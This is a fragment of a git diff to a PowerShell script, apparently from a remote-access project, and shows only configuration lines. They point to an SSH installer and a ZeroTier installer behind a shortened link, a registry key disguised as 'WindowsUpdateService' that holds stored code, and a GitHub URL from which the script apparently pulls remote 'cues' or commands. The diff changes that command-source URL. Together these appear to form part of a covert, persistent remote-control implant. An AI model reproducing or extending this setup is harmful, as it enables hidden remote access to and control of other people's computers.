@@ -16,7 +16,7 @@ $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/raw-ssh-install"
 $ztinstall = "https://tinyurl.com/ztinstall"
-$codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/remcue?cachebuster=$(Get-Random)"
+$codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
 $programDataPath = $env:ProgramData
 $storedData = (Get-ItemProperty -Path $regPath).Data
 $storedCode = (Get-ItemProperty -Path $regPath).Code
